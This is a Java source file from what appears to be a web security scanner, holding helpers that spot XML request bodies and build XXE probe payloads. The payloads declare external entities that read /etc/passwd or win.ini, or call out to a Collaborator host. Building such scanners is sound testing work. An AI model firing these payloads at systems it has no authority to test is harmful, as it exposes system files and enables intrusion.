package com.victor.reconloop;

import java.util.List;
import java.util.Locale;

/**
 * Pure XML-External-Entity (XXE) helpers: recognises requests that carry an XML body (the XXE attack
 * surface) and builds the probe payloads. Dependency-free and directly unit-testable; the actual
 * sending, scope/budget gating, and in-band leak confirmation live in {@link ActiveTestEngine}.
 *
 * <p>Probes replace the request body with a minimal document that declares an external entity and
 * references it, so a parser that resolves external entities either returns the file contents in-band
 * (confirmed via the same {@code /etc/passwd} / {@code win.ini} canaries as path traversal) or makes
 * an out-of-band request to a Collaborator host.
 */
final class XxeEngine {

    private XxeEngine() {}

    /**
     * True when a request looks like it carries an XML body — an {@code xml} content-type
     * (application/xml, text/xml, application/soap+xml, any {@code +xml}) or a body that opens with
     * an XML declaration or DOCTYPE. Deliberately conservative: a bare {@code <tag>} without either
     * signal is not treated as XML, so HTML and other angle-bracket bodies are not probed.
     */
    static boolean isXmlBody(String contentType, String body) {
        if (contentType != null && contentType.toLowerCase(Locale.ROOT).contains("xml")) return true;
        if (body == null) return false;
        String trimmed = body.stripLeading();
        return trimmed.startsWith("<?xml") || trimmed.regionMatches(true, 0, "<!DOCTYPE", 0, 9);
    }

    /** {@code file://} system identifiers whose contents are confirmable by the shared file canaries. */
    static List<String> fileReadSystemIds() {
        return List.of("file:///etc/passwd", "file:///c:/windows/win.ini");
    }

    /** In-band file-read payloads, one per {@link #fileReadSystemIds()} target. */
    static List<String> fileReadPayloads() {
        return fileReadSystemIds().stream().map(XxeEngine::buildPayload).toList();
    }

    /** An out-of-band payload whose external entity resolves to {@code collaboratorUrl}. */
    static String buildOobPayload(String collaboratorUrl) {
        return buildPayload(collaboratorUrl);
    }

    /**
     * A minimal XML document declaring an external entity pointing at {@code systemId} and referencing
     * it in the body, so a vulnerable parser expands it. {@code systemId} is a controlled probe target
     * ({@code file://} path or Collaborator URL), never attacker-uncontrolled input.
     */
    static String buildPayload(String systemId) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE recon [<!ENTITY xxe SYSTEM \"" + systemId + "\">]>"
                + "<recon>&xxe;</recon>";
    }
}
